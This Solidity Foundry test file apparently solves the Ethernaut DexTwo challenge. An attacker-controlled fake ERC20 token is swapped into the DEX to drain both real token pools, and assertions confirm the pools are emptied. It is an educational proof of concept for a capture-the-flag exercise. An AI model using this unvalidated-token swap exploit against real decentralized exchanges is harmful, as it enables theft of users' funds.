// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoTest is Test {
    DexTwo public dex;
    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");

    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    FakeToken public fakeToken;

    function setUp() public {
        vm.startPrank(owner);
        dex = new DexTwo(owner);

        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);

        dex.setTokens(address(token1), address(token2));
        console.log("Owner Token1 Balance before transfer:", token1.balanceOf(owner));

        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);

        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);
        console.log("Owner Token1 Balance After transfer:", token1.balanceOf(owner));

        // Deploy FakeToken
        fakeToken = new FakeToken(owner, "fakeToken", "MTK", 500);
        fakeToken.transfer(attacker, 400);
    }

    function test_drain_dex_with_fake_token() public {
        vm.startPrank(attacker);

        // Approve and transfer fake tokens to DexTwo
        fakeToken.approve(address(dex), 300);
        fakeToken.transfer(address(dex), 100);

        console.log("Dex Token1 Balance before:", token1.balanceOf(address(dex)));
        console.log("Dex Token2 Balance before:", token2.balanceOf(address(dex)));

        dex.swap(address(fakeToken), address(token2), 100);

        dex.swap(address(fakeToken), address(token1), 200);
        // Log the balances after the exploit
        console.log("Dex Token1 Balance:", token1.balanceOf(address(dex)));
        console.log("Dex Token2 Balance:", token2.balanceOf(address(dex)));
        console.log("Attacker Token1 Balance:", token1.balanceOf(attacker));
        console.log("Attacker Token2 Balance:", token2.balanceOf(attacker));

        // Assert the DexTwo contract is drained
        assertEq(token2.balanceOf(address(dex)), 0);
        assertEq(token1.balanceOf(address(dex)), 0);

        vm.stopPrank();
    }
}

contract FakeToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super.approve(spender, amount);
    }
}
